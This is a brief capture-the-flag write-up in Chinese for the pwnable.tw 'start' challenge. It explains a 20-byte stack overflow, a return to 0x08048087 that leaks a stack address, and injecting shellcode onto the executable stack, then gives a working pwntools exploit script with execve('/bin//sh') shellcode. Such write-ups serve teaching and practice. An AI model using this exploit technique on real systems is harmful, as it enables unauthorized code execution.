一開始的就把ebp push到stack上
所以整個start執行完時stack頂端就是ebp的值

start結尾是esp加20後就return
所以輸入超過20的話就可以淹到返回位置

把返回位置淹成0x08048087
剛剛好把ebp設成write system call的參數ecx
所以可以把stack address印出來

而且stack是可執行的
因此寫入shellcode再把返回位置改成shellcode即可



from pwn import *
#r = process('./start')
r = remote('chall.pwnable.tw',10000)
r.send('a'*20+p32(0x08048087))
r.recvuntil('CTF:')
stack_addr = u32(r.recv(4))
print 'stack addr = ',hex(stack_addr)
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
r.send('a'*20+p32(stack_addr+20)+shellcode)
r.interactive()
